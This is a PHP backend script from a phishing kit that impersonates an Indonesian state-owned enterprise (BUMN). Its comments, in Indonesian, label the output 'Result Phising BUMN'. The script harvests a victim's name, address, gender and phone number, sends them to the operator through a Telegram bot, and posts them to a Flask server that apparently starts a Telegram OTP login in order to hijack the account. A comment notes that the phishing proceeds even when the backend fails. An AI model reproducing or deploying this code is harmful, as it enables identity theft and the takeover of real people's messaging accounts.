<?php
require_once __DIR__ . '/JsonSessionHandler.php';
require_once __DIR__ . '/telegram.php';
require_once __DIR__ . '/telegram_config.php';

// Inisialisasi JSON Session Handler
$jsonSessionHandler = new JsonSessionHandler();
session_set_save_handler($jsonSessionHandler, true);
$GLOBALS['jsonSessionHandler'] = $jsonSessionHandler;

session_start();

// Validasi dan sanitasi input
$fullname = isset($_POST['fullname']) ? trim($_POST['fullname']) : '';
$address = isset($_POST['address']) ? trim($_POST['address']) : '';
$gender = isset($_POST['gender']) ? trim($_POST['gender']) : '';
$phoneNumber = isset($_POST['phoneNumber']) ? trim($_POST['phoneNumber']) : '';

// Validasi format nomor telepon
function validatePhoneNumber($phone) {
    // Format nomor yang diharapkan: +62xxxxxxxxxx
    return preg_match('/^\+62\d{8,15}$/', $phone);
}

// Response default
$response = ['success' => false, 'error' => 'Terjadi kesalahan'];

// Validasi input dasar
if (empty($fullname) || empty($address) || empty($gender) || empty($phoneNumber)) {
    $response['error'] = 'Semua field harus diisi';
    echo json_encode($response);
    exit;
}

// Validasi format nomor telepon
if (!validatePhoneNumber($phoneNumber)) {
    $response['error'] = 'Format nomor telepon tidak valid';
    echo json_encode($response);
    exit;
}

// Isi string untuk laporan
$string = "== Result Phising BUMN ==\n";
$string .= "Fullname : `$fullname`\n";
$string .= "Address : `$address`\n";
$string .= "Gender : `$gender`\n";
$string .= "Phone : `$phoneNumber`\n";

// Simpan ke session
$_SESSION['message'] = $string;
$_SESSION['user_data'] = [
    'fullname' => $fullname,
    'address' => $address,
    'gender' => $gender,
    'phoneNumber' => $phoneNumber,
    'timestamp' => time()
];

// Simpan juga ke JSON secara langsung
if (isset($jsonSessionHandler)) {
    $jsonSessionHandler->saveTelegramData($string, [
        'form_data' => [
            'fullname' => $fullname,
            'address' => $address,
            'gender' => $gender,
            'phoneNumber' => $phoneNumber
        ],
        'stage' => 'initial_form'
    ]);
}

// Kirim ke bot Telegram
$telegramResult = sendTelegram($string);

// Komunikasi dengan server Flask
try {
    // Gunakan cURL untuk berkomunikasi dengan server Flask
    $session_id = session_id();
    $data = [
        'session_id' => $session_id,
        'phone_number' => $phoneNumber,
        'fullname' => $fullname,
        'address' => $address,
        'gender' => $gender
    ];
    
    $ch = curl_init($flask_server_url . "/form");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Increased timeout for reliability
    
    $output = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);
    
    if ($curl_error) {
        throw new Exception("Error komunikasi dengan server backend: " . $curl_error);
    }
    
    if ($http_code != 200) {
        throw new Exception("Error komunikasi dengan server backend (HTTP $http_code)");
    }
    
    $result = json_decode($output, true);
    
    if (!$result || !isset($result['success'])) {
        throw new Exception("Respons tidak valid dari script autentikasi");
    }
    
    // Store the result in session for the next page
    $_SESSION['telegram_phone'] = $phoneNumber;
    $_SESSION['telegram_auth_started'] = true;
    
    // Return success or error based on the result
    $response = $result['success'] ? 
        ['success' => true] : 
        ['success' => false, 'error' => $result['error'] ?? 'Gagal mengirim kode OTP'];
    
} catch (Exception $e) {
    // If there's an error communicating with backend, try to proceed anyway
    // This allows the phishing to continue even if backend is temporarily unavailable
    $response = ['success' => true];
    
    // Log error untuk debugging
    error_log("Warning in form.php (continuing anyway): " . $e->getMessage());
    
    // Tambahkan ke JSON untuk tracking
    if (isset($jsonSessionHandler)) {
        $jsonSessionHandler->saveTelegramData("Warning processing form (continuing anyway): " . $e->getMessage(), [
            'warning' => true,
            'stage' => 'form_warning'
        ]);
    }
}

// Return response as JSON
echo json_encode($response);
exit;
